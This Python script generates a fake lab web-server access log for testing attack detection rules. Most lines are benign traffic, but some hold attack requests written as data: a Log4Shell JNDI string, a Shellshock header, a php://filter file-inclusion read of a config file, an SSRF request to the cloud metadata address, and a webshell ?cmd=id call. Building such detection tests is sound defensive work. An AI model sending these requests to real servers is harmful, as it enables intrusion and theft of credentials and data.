"""
Generate samples/web_attacks.log — fake lab access log for the web detection pack.
Payloads are inert detection markers pointing at .invalid domains (RFC 2606: never resolvable).

  45.33.10.5   login brute force on /wp-login.php, then a 302      → web brute force + success
  45.33.10.6   wordlist scan, 40 × 404 in 40 s                      → directory brute force
  45.33.10.7   Log4Shell / Shellshock markers, file inclusion, SSRF → exploitation attempts
  45.33.10.8   POSTs to a .php in uploads/ + ?cmd= requests         → webshell
  45.33.10.9   600 MB database dump download                        → large transfer
  192.168.1.20 normal browsing, one normal login, a 3 GB .iso       → must stay quiet
"""

import random
from datetime import datetime, timedelta
from pathlib import Path

random.seed(11)
lines = []
t0 = datetime(2024, 3, 21, 9, 0, 0)
BROWSER = "Mozilla/5.0 (X11; Linux x86_64) Firefox/124.0"


def req(sec, ip, method, path, status, size=512, agent=BROWSER):
    ts = (t0 + timedelta(seconds=sec)).strftime("%d/%b/%Y:%H:%M:%S +0000")
    lines.append((sec, f'{ip} - - [{ts}] "{method} {path} HTTP/1.1" {status} {size} "-" "{agent}"'))


for i in range(15):
    req(i * 3, "45.33.10.5", "POST", "/wp-login.php", 200, 4200, "python-requests/2.31")
req(48, "45.33.10.5", "POST", "/wp-login.php", 302, 0, "python-requests/2.31")
req(50, "45.33.10.5", "GET", "/wp-admin/", 200, 18000, "python-requests/2.31")

words = ["old", "dev", "test", "staging", "api_v1", "private", "secret", "db", "logs", "tmp", "archive",
         "admin2", "portal", "panel", "beta", "internal", "export", "dump", "users", "files"]
for i in range(40):
    req(100 + i, "45.33.10.6", "GET", f"/{random.choice(words)}{random.randint(1, 99)}", 404, 196, "gobuster/3.6")
req(141, "45.33.10.6", "GET", "/backup/", 200, 1024, "gobuster/3.6")

req(200, "45.33.10.7", "GET", "/", 200, 5000, "${jndi:ldap://lab-marker.invalid/a}")
req(201, "45.33.10.7", "GET", "/cgi-bin/status", 500, 300, "() { :; }; echo lab-marker")
req(202, "45.33.10.7", "GET", "/index.php?page=php://filter/convert.base64-encode/resource=config", 200, 900)
req(203, "45.33.10.7", "GET", "/fetch?url=http://169.254.169.254/latest/meta-data/", 200, 400)

for i in range(4):
    req(300 + i * 20, "45.33.10.8", "POST", "/wp-content/uploads/2024/03/thumb.php", 200, 120)
req(390, "45.33.10.8", "GET", "/wp-content/uploads/2024/03/thumb.php?cmd=id", 200, 60)

req(500, "45.33.10.9", "GET", "/backup/db_full.sql", 200, 600 * 1024 * 1024, "curl/8.5")

for i in range(20):
    req(random.randint(0, 600), "192.168.1.20", "GET", random.choice(["/", "/blog/", "/about", "/css/site.css"]), 200, 3000)
req(610, "192.168.1.20", "POST", "/wp-login.php", 302, 0)
req(620, "192.168.1.20", "GET", "/downloads/ubuntu-24.04.iso", 200, 3 * 1024 ** 3)

out = Path(__file__).resolve().parent / "web_attacks.log"
out.write_text("\n".join(line for _, line in sorted(lines, key=lambda x: x[0])) + "\n")
print(f"wrote {len(lines)} lines to {out}")
